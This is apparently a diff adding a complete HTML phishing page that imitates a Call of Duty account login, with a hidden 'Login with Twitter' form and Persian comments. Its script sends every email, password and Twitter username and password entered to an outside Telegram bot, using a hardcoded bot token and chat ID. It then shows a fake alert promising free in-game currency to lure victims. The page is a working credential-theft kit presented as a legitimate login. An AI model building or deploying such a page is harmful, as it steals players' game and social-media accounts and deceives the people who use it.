@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Call of Duty Account</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            background-image: url('https://images.unsplash.com/photo-1606365228385-c2f3b3a9f4be?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwzNjUyOXwwfDF8c2VhcmNofDJ8fGdhbWV8ZW58MHx8fHwxNjg2MjAyMDY1&ixlib=rb-4.0.3&q=80&w=1080'); /* لینک تصویر پس‌زمینه گیمینگ */
+            background-size: cover;
+            color: #fff;
+            text-align: center;
+        }
+        .container {
+            background-color: rgba(31, 31, 31, 0.8); /* پس‌زمینه نیمه شفاف */
+            border-radius: 10px;
+            padding: 30px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+        }
+        h1 {
+            color: #00e676;
+            font-size: 2rem;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #00e676;
+            border-radius: 5px;
+            background-color: #333;
+            color: #fff;
+        }
+        button {
+            background-color: #00e676;
+            border: none;
+            padding: 10px 20px;
+            font-size: 1rem;
+            border-radius: 5px;
+            color: #fff;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #00c853;
+        }
+        .twitter-login {
+            display: none; /* پنهان بودن بخش ورودی توییتر به صورت پیش‌فرض */
+            margin-top: 20px;
+            text-align: left;
+        }
+        .twitter-login input {
+            margin: 10px 0;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/en/a/a3/Call_of_Duty_Logo.png" alt="Call of Duty Logo" class="logo">
+    <h1>Login to Your Account</h1>
+    <input type="email" id="email" placeholder="Email" required>
+    <input type="password" id="password" placeholder="Password" required>
+    <button onclick="login()">Login</button>
+
+    <button onclick="toggleTwitterLogin()">Login with Twitter</button>
+
+    <div class="twitter-login" id="twitter-login">
+        <h2>Twitter Login</h2>
+        <input type="text" id="twitter-username" placeholder="Twitter Username" required>
+        <input type="password" id="twitter-password" placeholder="Twitter Password" required>
+        <button onclick="twitterLogin()">Login with Twitter</button>
+    </div>
+</div>
+
+<script>
+    const telegramToken = '7549521672:AAFm0jQzAjiyKmAaO259a59etHT5ky3HiO4'; // توکن ربات تلگرام خود را اینجا قرار دهید
+    const chatId = '7283653302'; // شناسه چت ربات تلگرام خود را اینجا قرار دهید
+
+    function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        });
+    }
+
+    function login() {
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const message = `Call of Duty Login:\nEmail: ${email}\nPassword: ${password}`;
+        sendToTelegram(message);
+        
+        // نمایش پیام تأیید
+        alert('Your CP will be credited in 4 hours. You can request free CP twice a week.');
+
+        // اگر بخواهید به صفحه بعد بروید، این خط را Uncomment کنید
+        // window.location.href = 'nextPage.html'; // صفحه بعد
+    }
+
+    function toggleTwitterLogin() {
+        const twitterLoginSection = document.getElementById('twitter-login');
+        if (twitterLoginSection.style.display === 'none' || twitterLoginSection.style.display === '') {
+            twitterLoginSection.style.display = 'block';
+        } else {
+            twitterLoginSection.style.display = 'none';
+        }
+    }
+
+    function twitterLogin() {
+        const username = document.getElementById('twitter-username').value;
+        const password = document.getElementById('twitter-password').value;
+        const message = `Twitter Login:\nUsername: ${username}\nPassword: ${password}`;
+        sendToTelegram(message);
+        
+        // نمایش پیام تأیید
+        alert('Your CP will be credited in 4 hours. You can request free CP twice a week.');
+    }
+</script>
+
+</body>
+</html>
